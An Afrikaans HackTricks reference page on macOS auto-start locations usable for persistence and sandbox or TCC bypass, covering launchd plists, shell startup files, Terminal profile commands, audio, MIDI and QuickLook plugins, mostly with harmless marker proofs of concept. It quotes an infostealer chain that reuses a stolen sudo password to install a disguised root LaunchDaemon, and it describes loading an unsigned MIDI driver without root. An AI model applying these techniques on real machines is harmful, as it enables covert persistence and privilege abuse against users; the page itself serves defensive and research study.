# macOS Outoomatiese Begin

{{#include ../banners/hacktricks-training.md}}

Hierdie afdeling is grootliks gebaseer op die blogreeks [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Die doel daarvan is om liggings te identifiseer waar ’n lêerskrywing later tot kode-uitvoering kan lei, die gebeurtenis wat uitvoering aktiveer, en die vereiste toestemmings. Die teenwoordigheid van ’n ligging is nie ’n bewys dat die meganisme geaktiveer is nie. Die plaaslike kontroles wat hieronder genoem word, is op macOS 26.5.2 (5 Oktober 2026) uitgevoer; dit bevestig nie gedrag op elke macOS-weergawe nie.

> [!NOTE]
> “Skryf-geaktiveer” beteken nie altyd “loop onmiddellik nadat dit geskryf is” nie. Sommige liggings word slegs gelees wanneer jy aanmeld, wanneer ’n spesifieke toepassing begin, of wanneer ’n gebruiker ’n handeling uitvoer. ’n Skryfbare payload binne ’n reeds opgestelde taak verskil ook van toestemming om ’n nuwe taak te registreer. Toets dit in ’n weggooibare rekening of VM voordat jy op ’n tegniek staatmaak.

## Sandbox Bypass

> [!TIP]
> Hier kan jy beginliggings vind wat nuttig is vir **sandbox bypass** en jou toelaat om iets eenvoudig uit te voer deur dit **na ’n lêer te skryf** en te **wag** vir ’n baie **algemene** **handeling**, ’n bepaalde **tydperk**, of ’n **handeling wat jy gewoonlik kan uitvoer** vanuit ’n sandbox sonder root-toestemmings.

### Launchd

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Liggings

- **`/Library/LaunchAgents`**
  - **Sneller**: Gebruiker se aanmelding (of uitdruklike registrasie)
  - Root benodig
- **`/Library/LaunchDaemons`**
  - **Sneller**: Stelselselflaai (of uitdruklike registrasie)
  - Root benodig
- **`/System/Library/LaunchAgents`**
  - **Sneller**: Gebruiker se aanmelding; beskermde Apple-stelselligging
- **`/System/Library/LaunchDaemons`**
  - **Sneller**: Stelselselflaai; beskermde Apple-stelselligging
- **`~/Library/LaunchAgents`**
  - **Sneller**: Heraanmelding

Daar is geen `~/Library/LaunchDaemons`-ligging wat deur `launchd` geskandeer word nie. Per-gebruiker take hoort in `~/Library/LaunchAgents`; die stelseldemoon-gids is `/Library/LaunchDaemons`. [Apple se launchd-begingids](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) dokumenteer die liggings wat geskandeer word.

> [!TIP]
> As interessante feit het **`launchd`** ’n ingebedde property list in die Mach-o-afdeling `__Text.__config`, wat ander bekende dienste bevat wat launchd moet begin. Boonop kan hierdie dienste die `RequireSuccess`, `RequireRun` en `RebootOnSuccess` bevat, wat beteken dat hulle uitgevoer moet word en suksesvol moet voltooi.
>
> Natuurlik kan dit nie gewysig word nie weens code signing.

#### Beskrywing & Uitbuiting

**`launchd`** is die **eerste** **proses** wat deur die OX S-kern tydens opstart uitgevoer word en die laaste een wat tydens afskakeling eindig. Dit behoort altyd **PID 1** te hê. Hierdie proses sal die konfigurasies wat in die **ASEP**-**plists** aangedui word, in die volgende liggings **lees en uitvoer**:

- `/Library/LaunchAgents`: Per-gebruiker-agente wat deur die admin geïnstalleer is
- `/Library/LaunchDaemons`: Stelselwye demone wat deur die admin geïnstalleer is
- `/System/Library/LaunchAgents`: Per-gebruiker-agente wat deur Apple verskaf word.
- `/System/Library/LaunchDaemons`: Stelselwye demone wat deur Apple verskaf word.

Wanneer ’n gebruiker aanmeld, laai `launchd` die plists in daardie gebruiker se `~/Library/LaunchAgents` met daardie gebruiker se toestemmings. Take word volgens hul sleutels begin; die laai van ’n plist alleen beteken nie dat die proses onmiddellik uitgevoer word nie.

Die **hoofverskil tussen agente en demone is dat agente gelaai word wanneer die gebruiker aanmeld en demone tydens stelselselflaai gelaai word** (aangesien daar dienste soos ssh is wat uitgevoer moet word voordat enige gebruiker toegang tot die stelsel kry). Agente kan ook GUI gebruik, terwyl demone in die agtergrond moet loop.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Elke `ProgramArguments`-element is ’n aparte argument; `launchd` ontleed nie ’n enkele string as ’n shell-opdrag nie. Die reggestelde voorbeeld hierbo kan op sintaksis nagegaan word sonder om dit te laai, met `plutil -lint /path/to/example.plist`. Sien die plaaslike `man launchd.plist`-inskrywing vir `ProgramArguments`, `RunAtLoad` en `KeepAlive`.

#### Lêergebeurtenis-snellers in bestaande take

’n **Reeds gelaaide** agent of daemon kan `WatchPaths` gebruik om te begin wanneer ’n benoemde pad verander. `QueueDirectories` begin ’n taak terwyl ’n gids nie leeg is nie; `StartOnMount` begin wanneer ’n volume gemonteer word. [Apple se launchd-gids](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) bevat voorbeelde van `WatchPaths` en `QueueDirectories`. ’n Skryfbewerking na ’n lêer waarna gekyk word, aktiveer die **reeds opgestelde taak**; dit bied arbitrêre kode-uitvoering slegs as die skrywer ook die taak se uitvoerbare lêer, script of data wat die taak interpreteer, kan beheer. Om bloot ’n nuwe plist buite ’n geskandeerde of geregistreerde ligging te skryf, laai dit nie.

Hierdie selfopruimende PoC registreer ’n uniek benoemde **tydelike gebruikersagent**, verander slegs sy eie lêer waarna gekyk word, en verwyder die agent. Dit is suksesvol op macOS 26.5.2 uitgevoer sonder om af te meld of te herbegin:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

Die plaaslike uitvoering het `watch fired: True` gewys, en `bootout` het geslaag. `launchctl bootstrap` word hier slegs binne die geïsoleerde PoC gebruik; dit is **nie** nodig vir ’n job wat reeds gelaai is nie. Om ’n bestaande job veilig te beoordeel, lees sy plist en die opgeloste `ProgramArguments`-pad, en kyk dan of die toepaslike uitvoerbare lêer of geïnterpreteerde lêer skryfbaar is sonder om dit te verander.

Daar is gevalle waar ’n **agent uitgevoer moet word voordat die gebruiker aanmeld**; dit word **PreLoginAgents** genoem. Dit is byvoorbeeld nuttig om ondersteunende tegnologie tydens aanmelding beskikbaar te stel. Hulle kan ook in `/Library/LaunchAgents` gevind word (sien [**hier**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) ’n voorbeeld).

> [!TIP]
> Nuwe Daemon- of Agent-konfigurasielêers sal **ná die volgende herlaai of met** `launchctl load <target.plist>` **gelaai word**. Dit is **ook moontlik om .plist-lêers sonder daardie uitbreiding te laai** met `launchctl -F <file>` (hierdie plist-lêers sal egter nie outomaties ná herlaai gelaai word nie).\
> Dit is ook moontlik om dit te **ontlaai** met `launchctl unload <target.plist>` (die proses waarna dit wys, sal beëindig word),
>
> Om te **verseker** dat daar nie **enigiets** (soos ’n oorheersing) is wat ’n **Agent** of **Daemon** **verhoed om** **te loop nie**, voer uit: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Lys al die agente en daemons wat deur die huidige gebruiker gelaai is:

```bash
launchctl list
```

#### Voorbeeld van ’n kwaadwillige LaunchDaemon-ketting (hergebruik van wagwoord)

’n Onlangse macOS-infostealer het ’n **vasgelegde sudo-wagwoord** hergebruik om ’n user agent en ’n root LaunchDaemon te installeer:<sup>[[1]](#references)</sup>

- Skryf die agent-lus na `~/.agent` en maak dit uitvoerbaar.
- Genereer ’n plist in `/tmp/starter` wat na daardie agent verwys.
- Hergebruik die gesteelde wagwoord met `sudo -S` om dit na `/Library/LaunchDaemons/com.finder.helper.plist` te kopieer, stel `root:wheel` in en laai dit met `launchctl load`.
- Begin die agent stilweg met `nohup ~/.agent >/dev/null 2>&1 &` om die uitvoer te ontkoppel.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> ’n Daemon-plist wat in `/Library/LaunchDaemons` geplaas word, word nie veilig gemaak deur dit aan ’n gebruiker te laat behoort nie. `launchd` vereis toepaslike eienaarskap en toestemmings vir stelseltake en kan ’n onveilige plist verwerp. ’n Daemon wat deur root besit word, loop gewoonlik as root tensy sy konfigurasie ’n ander rekening kies. Kontroleer die taak se `UserName`, `GroupName`, eienaarskap en `launchctl`-diagnostiek; moenie die uitvoeringsidentiteit bloot uit die naam van die plist se eienaar aflei nie.

#### Meer inligting oor launchd

**`launchd`** is die **eerste** gebruikersmodusproses wat vanaf die **kernel** begin word. Die proses moet **suksesvol** begin en mag **nie afsluit of crash nie**. Dit is selfs **beskerm** teen sommige **doodmaakseine**.

Een van die eerste dinge wat `launchd` sou doen, is om al die **daemons** te **begin**, soos:

- **Timer-daemons** wat op grond van die tyd begin word:
  - `com.apple.atrun.plist` roep `/usr/libexec/atrun` met `StartInterval = 30` sekondes in macOS 26.5.2 aan; die werklike geaktiveerde toestand kan verskil van die plist se `Disabled`-sleutel omdat launchd oorrides afsonderlik behou.
  - `com.vix.cron.plist` roep `/usr/sbin/cron` aan wanneer `/usr/lib/cron/tabs` take bevat. `com.apple.systemstats.daily` is ’n ander geskeduleerde diens, nie die cron-daemon nie.
- **Netwerkdaemons** soos:
  - `org.cups.cups-lpd`: Luister op TCP (`SockType: stream`) met `SockServiceName: printer`
    - SockServiceName moet óf ’n poort óf ’n diens uit `/etc/services` wees
  - `com.apple.xscertd.plist`: Luister op TCP-poort 1640
- **Pad-daemons** wat uitgevoer word wanneer ’n gespesifiseerde pad verander:
  - `com.apple.postfix.master`: Kontroleer die pad `/etc/postfix/aliases`
- **IOKit-kennisgewingdaemons**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach-poort:**
  - `com.apple.xscertd-helper.plist`: Die `MachServices`-inskrywing dui die naam `com.apple.xscertd.helper` aan
- **UserEventAgent:**
  - Dit verskil van die vorige een. Dit laat launchd toepassings in reaksie op spesifieke gebeurtenisse begin. In hierdie geval is die hoofbinêre lêer egter nie `launchd` nie, maar `/usr/libexec/UserEventAgent`. Dit laai plugins uit die SIP-beperkte gids /System/Library/UserEventPlugins/, waar elke plugin sy initialiseerder in die `XPCEventModuleInitializer`-sleutel aandui, of, in die geval van ouer plugins, in die `CFPluginFactories`-woordeboek onder die sleutel `FB86416D-6164-2070-726F-70735C216EC0` van sy `Info.plist`.

### shell-opstartlêers

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
  - Maar jy moet ’n toepassing vind met ’n TCC-bypass wat ’n shell uitvoer wat hierdie lêers laai

#### Ligging

- **`~/.zshenv`** (of ’n nuwer, saamgestelde **`~/.zshenv.zwc`**)
  - **Sneller**: Enige gewone zsh-aanroep, insluitend ’n nie-interaktiewe `zsh -c`; `zsh -f` slaan gebruiker-opstartlêers oor.
- **`~/.zshrc`**
  - **Sneller**: Interaktiewe zsh begin.
- **`~/.zprofile`, `~/.zlogin`**
  - **Sneller**: Login-zsh begin; hierdie lêers word onderskeidelik voor en ná `.zshrc` gelees.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Sneller**: Maak ’n terminaal met zsh oop
  - Root word vereis
- **`~/.zlogout`**
  - **Sneller**: ’n Login-zsh sluit normaal af; dit gebeur nie met elke terminaal- of shell-afsluiting nie.
- **`/etc/zlogout`**
  - **Sneller**: Sluit ’n terminaal met zsh af
  - Root word vereis
- Moontlik meer in: **`man zsh`**
- **`~/.bashrc`**
  - **Sneller**: Begin interaktiewe **nie-login** Bash. ’n Interaktiewe login-Bash lees dit slegs as ’n login-lêer dit eksplisiet laai.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Sneller**: Begin login-Bash; die eerste leesbare lêer in daardie volgorde word uitgevoer. `~/.profile` word oorgeslaan as enige van die vorige lêers bestaan.
- **`/etc/profile`**
  - **Sneller**: Begin login-Bash; root word vereis om dit te verander.
- **`~/.tcshrc`** of, indien dit ontbreek, **`~/.cshrc`**
  - **Sneller**: Begin `tcsh`, insluitend ’n nie-interaktiewe `tcsh -c` op hierdie Mac. Die gebruiker moet werklik `tcsh` aanroep; dit is nie die verstek macOS-shell nie.
- **`~/.login`**
  - **Sneller**: Begin ’n login-`tcsh` ná sy rc-lêer.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Sneller**: Behoort met xterm te aktiveer, maar dit **is nie geïnstalleer nie**, en selfs ná installering verskyn hierdie fout: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Beskrywing en uitbuiting

Wanneer ’n shell-omgewing soos `zsh` of `bash` begin word, word **sekere opstartlêers uitgevoer**. macOS gebruik tans `/bin/zsh` as die verstek-shell. Of Terminal of SSH ’n login- of interaktiewe shell begin, hang van hul konfigurasie af; moenie aanvaar dat elke lêer hierbo in elke sessie uitgevoer word nie. Hoewel `bash` en `sh` ook in macOS beskikbaar is, moet hulle eksplisiet aangeroep word om hulle te gebruik.<sup>[[2]](#references)</sup> Die [zsh-opstartlêerverwysing](https://zsh.sourceforge.io/Doc/Release/Files.html) beskryf die volgorde, die `ZDOTDIR`-oorstelling en die `.zwc`-reël.

Die volgende leesalleen-eksperiment het ’n weggooibare `ZDOTDIR` op macOS 26.5.2 gebruik. Dit wys watter gebruikerslêers gelees is; geen werklike shell-opstartlêer is verander nie:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

Die waargenome volgorde was `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` moet reeds na die alternatiewe gids wys; dit is nie genoeg om bloot lêers in ’n willekeurige gids te skryf nie.

[Bash se opstartverwysing](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) onderskei tussen aanmeld- en interaktiewe skulpe. Op die macOS 26.5.2-toetsmasjien het ’n geïsoleerde `HOME` met al vier gebruiker-opstartlêers die volgende opgelewer: `bash -c` → geen; `bash -ic` → `.bashrc`; `bash -lc` en `bash -lic` → slegs `.bash_profile`. Nadat `.bash_profile` verwyder is, het Bash vir aanmeldings `.bash_login` gelees, en daarna `.profile` toe dié ook verwyder is. `BASH_ENV` kan nie-interaktiewe Bash na ’n lêer wys, maar daardie omgewingsveranderlike moet reeds in die aanroepende proses gestel wees. ’n Eksplisiete `exit` uit ’n Bash-aanmeldingsdop kan ook `~/.bash_logout` laai.

Die plaaslike `tcsh(1)`-handleiding dokumenteer die afsonderlike opstartvolgorde. Met ’n tydelike `HOME` het `/bin/tcsh -c :` `.tcshrc` gelees, of `.cshrc` wanneer `.tcshrc` nie bestaan het nie. ’n Tydelike `tcsh`-aanmeldingsdop het `.tcshrc` en `.login` gelees. Hierdie toetse het slegs tydelike lêers geskep en verwyder.

### Heropende toepassings

> [!CAUTION]
> In die toetsing het die instelling van die aangeduide uitbuiting en die uit- en weer-aanmelding, of selfs ’n herlaai, nie die toepassing uitgevoer nie. Die toepassing moet dalk loop wanneer hierdie handelinge uitgevoer word.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Sneller**: Herbegin wanneer toepassings heropen word

#### Beskrywing & Exploitation

Al die toepassings wat heropen moet word, is binne die plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Om die toepassings wat heropen word jou eie toepassing te laat begin, hoef jy net **jou toepassing by die lys te voeg**.

Die UUID kan gevind word deur daardie gids te lys, of met `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Om te kontroleer watter toepassings heropen gaan word, kan jy die volgende uitvoer:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Om **'n toepassing by hierdie lys te voeg** kan jy gebruik:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Terminal-voorkeure

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal is gebruik om FDA-toestemmings van die gebruiker te hê wat dit gebruik

#### Ligging

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Sneller**: Maak 'n nuwe Terminal-venster of -oortjie oop met die profiel waarvan die Shell-instellings die opstartopdrag bevat

#### Beskrywing en uitbuiting

In **`~/Library/Preferences`** word die toepassings se voorkeure vir die gebruiker gestoor. Sommige van hierdie voorkeure kan 'n konfigurasie bevat om **ander toepassings/skripte uit te voer**.<sup>[[5]](#references)</sup>

Terminal kan byvoorbeeld 'n opdrag tydens opstart uitvoer:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Hierdie konfigurasie word soos volg in die lêer **`~/Library/Preferences/com.apple.Terminal.plist`** weerspieël:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

As die betrokke profiel ’n opstartopdrag bevat en Terminal daardie voorkeur lees, kan ’n nuwe sessie wat daardie profiel gebruik dit uitvoer. [Apple se huidige Terminal-gids](https://support.apple.com/guide/terminal/trmlshll/mac) dokumenteer die opdrag per profiel onder **Shell → Startup**. Om Terminal bloot oop te maak sonder om ’n nuwe sessie te begin wat daardie profiel gebruik, is nie genoeg nie. Die voorkeurwysigings hieronder is **nie** op die navorsings-Mac uitgevoer nie.

Jy kan dit vanaf die cli byvoeg met:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal-skripte / ander lêeruitbreidings

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC-omseiling: [✅](https://emojipedia.org/check-mark-button)
  - Terminal gebruik om die gebruiker se FDA-toestemmings te hê

#### Ligging

- **Enige plek**
  - **Sneller**: Maak die spesifieke `.terminal`-, `.command`- of `.tool`-lêer oop

#### Beskrywing en uitbuiting

As ’n gebruiker ’n **`.terminal`**-instellingslêer oopmaak, kan Terminal ’n sessie vanaf sy profiel skep; uitvoerbare **`.command`**- en **`.tool`**-lêers kan ook in Terminal oopmaak. Dit is ’n eksplisiete lêer-oopsneller, nie uitvoering deur bloot Terminal oop te maak nie. Enige geërfde TCC-toegang hang af van Terminal se werklike toestemmings en die bewerking wat probeer word. Die historiese voorbeeld hieronder is nie op die navorsings-Mac uitgevoer nie.

Probeer dit met:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

Jy kan ook die uitbreidings **`.command`**, **`.tool`** gebruik, met gewone shell-skripinhoud; hulle sal ook deur Terminal oopgemaak word.

> [!CAUTION]
> As Terminal **Full Disk Access** het, sal dit daardie aksie kan voltooi (let daarop dat die uitgevoerde opdrag in ’n Terminal-venster sigbaar sal wees).

### Oudio-inproppe

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC-omseiling: [🟠](https://emojipedia.org/large-orange-circle)
  - Jy kan dalk ekstra TCC-toegang kry

#### Ligging

- **`/Library/Audio/Plug-Ins/HAL`**
  - Root word vereis
  - **Sneller**: Die Core Audio-bediener laai ’n versoenbare HAL-toestel-inprop; ’n bedienerherbegin kan veroorsaak dat dit weer ontdek word
- **`/Library/Audio/Plug-ins/Components`**
  - Root word vereis
  - **Sneller**: ’n Oudio-gasheer ontdek en instansieer die geïnstalleerde Audio Unit
- **`~/Library/Audio/Plug-ins/Components`**
  - **Sneller**: ’n Oudio-gasheer ontdek en instansieer die geïnstalleerde Audio Unit
- **`/System/Library/Components`**
  - Apple-verskafde, stelselbeskermde ligging
  - **Sneller**: ’n Oudio-gasheer instansieer ’n ooreenstemmende stelselkomponent

#### Beskrywing

Volgens die vorige writeups is dit moontlik om **sommige audio-inproppe te compile** en hulle te laat laai.<sup>[[6]](#references)[[7]](#references)</sup>

HAL-toestel-inproppe en Audio Units is afsonderlike laaipaaie. [Apple se gids vir Audio Unit-gasheerprogrammatuur](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) sê dat ’n gasheer ’n komponent moet vind en instansieer; om een na ’n skandeergids te kopieer of `coreaudiod` te herbegin, bewys nie op sigself dat dit uitgevoer word nie. AUv2-inproppe loop in die gasheerproses, terwyl [Apple se huidige Audio Unit-riglyne](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) sê dat AUv3 by verstek in ’n afsonderlike proses op macOS loop. Handtekening-, sandbox- en biblioteekvalideringsvereistes hang van die gasheer af. Geen audio-inprop is op die navorsings-Mac geïnstalleer of uitgevoer nie.

### CoreMIDI-drywers (MIDIServer)

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Jou kode loop binne die `MIDIServer`-proses, nie jou toepassing se sandbox nie
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` loop onder sy eie `seatbelt`-sandboxprofiel

#### Ligging

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Root word nie vereis nie (skryfbaar deur die gebruiker)
  - **Sneller**: `MIDIServer` begin (weer). Dit word op aanvraag geloods wanneer enige proses CoreMIDI die eerste keer gebruik (deur *Audio MIDI Setup*, GarageBand, ’n DAW of ’n bladsy wat WebMIDI gebruik, oop te maak)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Root word vereis
  - **Sneller**: dieselfde as hierbo

#### Beskrywing en uitbuiting

Apple se `MIDIServer` (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) laai MIDI-**drywer**-bundels uit die `Audio/MIDI Drivers`-gidse. Die binêre lêer is deur Apple onderteken, maar word met die `com.apple.security.cs.disable-library-validation`-reg verpak, dus sal dit ’n bundel laai wat **nie onderteken is nie of ad hoc deur ’n ander span onderteken is**. Dit lei tot kode-uitvoering binne ’n afsonderlike, Apple-besitte proses **sonder root**.<sup>[[53]](#references)</sup>

Geverifieer op macOS 26 (leesalleen):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

'n Drywer is 'n standaard-bundel wat 'n `MIDIDriverInterface`-fabriek uitvoer; as jy die payload in die fabriek/konstruktor plaas, loop dit sodra `MIDIServer` die drywers lys. Bou dit, plaas dit as `~/Library/Audio/MIDI Drivers/Evil.plugin`, en aktiveer dan 'n laai sonder om af te meld of te herlaai:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC-bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Jy kan dalk ekstra TCC-toegang kry

#### Ligging

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Beskrywing en uitbuiting

QuickLook-plugins kan uitgevoer word wanneer jy **die voorskou van ’n lêer aktiveer** (druk die spasiebalk terwyl die lêer in Finder gekies is) en ’n **plugin wat daardie lêertipe ondersteun** geïnstalleer is.<sup>[[8]](#references)</sup>

Jy kan jou eie QuickLook-plugin saamstel, dit op een van die vorige liggings plaas om dit te laai, en dan na ’n ondersteunde lêer gaan en die spasiebalk druk om dit te aktiveer.

Hierdie paaie verwys na verouderde `.qlgenerator`-bundels; [Apple se argitektuurgids vir Quick Look](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) dokumenteer die soekvolgorde en ooreenstemmende lêertipes. Huidige Quick Look-**app-uitbreidings** word saam met ’n app verpak en het ander registrasie- en uitvoeringsreëls. Die teenwoordigheid van ’n generator bewys nie dat dit vir die tipe gekies word of dat sy kode binne Finder self loop nie. Die verouderde generatorpad is aan die hand van dokumentasie en die teenwoordigheid van gidse nagegaan; geen generator is op die navorsings-Mac geïnstalleer of gelaai nie.

### ~~Aanmeld-/afmeld-hooks~~

> [!CAUTION]
> Dit het nie vir my gewerk nie, nie met die gebruiker se LoginHook of met die root LogoutHook nie

